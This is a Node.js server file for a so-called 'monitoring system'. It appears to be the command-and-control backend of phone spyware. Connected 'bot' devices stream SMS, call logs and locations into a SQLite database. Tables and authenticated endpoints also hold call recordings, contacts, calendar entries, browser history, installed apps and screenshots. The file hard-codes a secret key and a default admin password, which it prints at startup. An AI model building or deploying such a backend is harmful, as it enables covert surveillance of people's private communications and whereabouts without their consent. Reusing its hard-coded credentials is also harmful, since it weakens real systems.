const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');
const bodyParser = require('body-parser');
const session = require('express-session');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "http://localhost:3000",
        methods: ["GET", "POST"]
    }
});

const PORT = 3000;
const SECRET_KEY = 'monitoring-system-secret-key-2024';

// Middleware
app.use(cors({ origin: 'http://localhost:3000', credentials: true }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/recordings', express.static(path.join(__dirname, 'recordings')));

// Session middleware
app.use(session({
    secret: SECRET_KEY,
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 }
}));

// Initialize database
const db = new sqlite3.Database('./database.db', (err) => {
    if (err) return console.error('DB Error:', err.message);
    console.log('✓ Connected to the SQLite database.');
    initializeDatabase();
});

// Create all tables
function initializeDatabase() {
    db.serialize(() => {
        const tables = {
            users: `(id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT, email TEXT UNIQUE, role TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)`,
            devices: `(id INTEGER PRIMARY KEY, user_id INTEGER, device_name TEXT, device_type TEXT, serial_number TEXT UNIQUE, os_version TEXT, status TEXT, last_connection DATETIME, battery_level INTEGER, created_at DATETIME DEFAULT CURRENT_TIMESTAMP, FOREIGN KEY (user_id) REFERENCES users (id))`,
            messages: `(id INTEGER PRIMARY KEY, device_id INTEGER, message_type TEXT, sender TEXT, receiver TEXT, content TEXT, timestamp DATETIME, status TEXT, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            calls: `(id INTEGER PRIMARY KEY, device_id INTEGER, call_type TEXT, phone_number TEXT, duration INTEGER, timestamp DATETIME, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            locations: `(id INTEGER PRIMARY KEY, device_id INTEGER, latitude REAL, longitude REAL, accuracy REAL, address TEXT, timestamp DATETIME, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            call_recordings: `(id INTEGER PRIMARY KEY, device_id INTEGER, phone_number TEXT, duration INTEGER, file_path TEXT, timestamp DATETIME, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            apps: `(id INTEGER PRIMARY KEY, device_id INTEGER, app_name TEXT, package_name TEXT, version TEXT, installed_at DATETIME, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            calendar_events: `(id INTEGER PRIMARY KEY, device_id INTEGER, title TEXT, description TEXT, start_time DATETIME, end_time DATETIME, location TEXT, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            contacts: `(id INTEGER PRIMARY KEY, device_id INTEGER, name TEXT, phone_number TEXT, email TEXT, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            browser_history: `(id INTEGER PRIMARY KEY, device_id INTEGER, url TEXT, title TEXT, timestamp DATETIME, FOREIGN KEY (device_id) REFERENCES devices (id))`,
            screenshots: `(id INTEGER PRIMARY KEY, device_id INTEGER, file_path TEXT, timestamp DATETIME, FOREIGN KEY (device_id) REFERENCES devices (id))`
        };

        for (const [name, schema] of Object.entries(tables)) {
            db.run(`CREATE TABLE IF NOT EXISTS ${name} ${schema}`);
        }
        console.log('✓ All tables created or already exist.');
        createAdminAccount();
    });
}

// Create admin account if not exists
function createAdminAccount() {
    const adminPassword = bcrypt.hashSync('admin@2026', 12);
    db.get('SELECT * FROM users WHERE username = ?', ['admin'], (err, row) => {
        if (err) return console.error(err.message);
        if (!row) {
            db.run('INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)',
                ['admin', adminPassword, 'admin@monitoring.system', 'admin'],
                (err) => { if(!err) console.log('✓ Admin account created.'); }
            );
        }
    });
}

// Auth Middleware
function authenticate(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1] || req.session.token;
    if (!token) return res.status(401).json({ error: 'Access Denied' });
    try {
        req.user = jwt.verify(token, SECRET_KEY);
        next();
    } catch (err) {
        res.status(401).json({ error: 'Invalid Token' });
    }
}

// --- SOCKET.IO REAL-TIME LOGIC ---
io.on('connection', (socket) => {
    console.log(`✓ A client connected via Socket.IO: ${socket.id}`);
    let deviceSerial = null; // To associate socket with a device

    socket.on('device_connect', (deviceInfo) => {
        try {
            deviceSerial = deviceInfo.serial_number;
            console.log(`Device with SN ${deviceSerial} is attempting to connect.`);
            // Update device status to 'connected' in the database
            db.run(`UPDATE devices SET status = ?, last_connection = datetime('now') WHERE serial_number = ?`,
                ['connected', deviceSerial],
                function(err) {
                    if (err) return console.error(`DB Error updating device status:`, err.message);
                    console.log(`✓ Device ${deviceSerial} marked as connected.`);
                    io.emit('dashboard_update', { type: 'device_status', data: { serial_number: deviceSerial, status: 'connected' } });
                }
            );
        } catch(e) { console.error('Error during device_connect:', e.message); }
    });

    socket.on('bot_data', (data) => {
        console.log(`Received data event: ${data.event}`);
        // Here we route the data to the correct database table
        switch(data.event) {
            case 'incoming_sms':
            case 'sent_sms':
                db.run(`INSERT INTO messages (device_id, message_type, sender, receiver, content, timestamp) VALUES ((SELECT id FROM devices WHERE serial_number = ?), ?, ?, ?, ?, ?)`,
                    [deviceSerial, data.event, data.sender, data.receiver, data.message, new Date(data.timestamp).toISOString()],
                    (err) => {
                        if (err) return console.error('DB Error inserting SMS:', err.message);
                        io.emit('dashboard_update', { type: 'new_sms', data });
                    });
                break;
            case 'new_call_log':
                 db.run(`INSERT INTO calls (device_id, call_type, phone_number, duration, timestamp) VALUES ((SELECT id FROM devices WHERE serial_number = ?), ?, ?, ?, ?)`,
                    [deviceSerial, data.data.type, data.data.number, data.data.duration, new Date(data.data.date).toISOString()],
                    (err) => {
                        if (err) return console.error('DB Error inserting call log:', err.message);
                        io.emit('dashboard_update', { type: 'new_call', data: data.data });
                    });
                break;
            case 'location_update':
                 db.run(`INSERT INTO locations (device_id, latitude, longitude, accuracy, timestamp) VALUES ((SELECT id FROM devices WHERE serial_number = ?), ?, ?, ?, ?)`,
                    [deviceSerial, data.latitude, data.longitude, data.accuracy, new Date(data.timestamp).toISOString()],
                    (err) => {
                        if (err) return console.error('DB Error inserting location:', err.message);
                        io.emit('dashboard_update', { type: 'new_location', data });
                    });
                break;
            // Add cases for other data types here...
        }
    });

    socket.on('disconnect', () => {
        console.log(`Client disconnected: ${socket.id}`);
        if(deviceSerial) {
             db.run(`UPDATE devices SET status = ? WHERE serial_number = ?`, ['disconnected', deviceSerial],
                function(err) {
                    if (err) return console.error(`DB Error updating device status on disconnect:`, err.message);
                    console.log(`✓ Device ${deviceSerial} marked as disconnected.`);
                    io.emit('dashboard_update', { type: 'device_status', data: { serial_number: deviceSerial, status: 'disconnected' } });
                }
            );
        }
    });
});


// --- API ROUTES ---
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    db.get('SELECT * FROM users WHERE username = ?', [username], (err, user) => {
        if (err || !user || !bcrypt.compareSync(password, user.password)) {
            return res.status(401).json({ success: false, error: 'Invalid credentials' });
        }
        const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, SECRET_KEY, { expiresIn: '24h' });
        req.session.token = token;
        res.json({ success: true, token, user });
    });
});

app.get('/api/check-auth', authenticate, (req, res) => res.json({ authenticated: true, user: req.user }));

const createApiEndpoint = (path, sql) => {
    app.get(path, authenticate, (req, res) => {
        db.all(sql, [req.user.id], (err, rows) => {
            if (err) return res.status(500).json({ error: 'Database error' });
            res.json(rows);
        });
    });
};

// Create all GET endpoints
createApiEndpoint('/api/devices', `SELECT * FROM devices WHERE user_id = ? ORDER BY last_connection DESC`);
createApiEndpoint('/api/calls', `SELECT * FROM calls WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY timestamp DESC`);
createApiEndpoint('/api/messages', `SELECT * FROM messages WHERE message_type = 'sms' AND device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY timestamp DESC`);
app.get('/api/messages/mms', authenticate, (req, res) => {
     db.all(`SELECT * FROM messages WHERE message_type = 'mms' AND device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY timestamp DESC`, [req.user.id], (err, rows) => {
        if (err) return res.status(500).json({ error: 'Database error' });
        res.json(rows);
    });
});
createApiEndpoint('/api/recordings', `SELECT * FROM call_recordings WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY timestamp DESC`);
createApiEndpoint('/api/apps', `SELECT * FROM apps WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY app_name ASC`);
createApiEndpoint('/api/calendar', `SELECT * FROM calendar_events WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY start_time DESC`);
createApiEndpoint('/api/contacts', `SELECT * FROM contacts WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY name ASC`);
createApiEndpoint('/api/websites', `SELECT * FROM browser_history WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY timestamp DESC`);
createApiEndpoint('/api/screenshots', `SELECT * FROM screenshots WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?) ORDER BY timestamp DESC`);

// Stats Endpoint
app.get('/api/stats', authenticate, async (req, res) => {
    const runQuery = (query) => new Promise((resolve, reject) => db.get(query, [req.user.id], (err, row) => err ? reject(err) : resolve(row)));
    try {
        res.json({
            devices: await runQuery(`SELECT COUNT(*) as total, SUM(CASE WHEN status = 'connected' THEN 1 ELSE 0 END) as connected FROM devices WHERE user_id = ?`),
            messages: await runQuery(`SELECT COUNT(*) as total FROM messages WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?)`),
            calls: await runQuery(`SELECT COUNT(*) as total FROM calls WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?)`),
            locations: await runQuery(`SELECT COUNT(*) as total FROM locations WHERE device_id IN (SELECT id FROM devices WHERE user_id = ?)`)
        });
    } catch (err) {
        res.status(500).json({ error: 'Error fetching stats' });
    }
});

// --- STATIC & APP ROUTES ---
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// --- SERVER START ---
server.listen(PORT, () => {
    console.log(`🚀 الخادم يعمل على http://localhost:${PORT}`);
    console.log(`🔐 بيانات الدخول: admin / admin@2026`);
});
